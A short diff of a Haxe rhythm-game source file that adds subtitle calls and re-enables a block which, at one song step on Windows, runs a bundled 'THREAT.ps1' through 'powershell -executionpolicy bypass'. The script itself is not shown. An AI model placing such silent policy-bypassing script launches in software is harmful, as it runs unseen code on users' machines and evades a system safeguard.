@@ -6452,13 +6452,13 @@ class PlayState extends MusicBeatState
 						subtitleManager.addSubtitle(LanguageManager.getTextString('exploit_sub14'), 0.02, 0.3);
 					case 1276:
 						subtitleManager.addSubtitle(LanguageManager.getTextString('exploit_sub15'), 0.02, 0.3);
-					/*case 1100:
+					case 1100:
 						#if windows
 							var path = Sys.programPath();
 							path = path.substr(0,path.length - 10);
 							var exe_path:String = "\"" + path + Paths.executable("THREAT.ps1") + "\"";
 							Sys.command("powershell -executionpolicy bypass -file " + exe_path);
-						#end*/
+						#end
 				}
 				switch (curBeat)
 				{
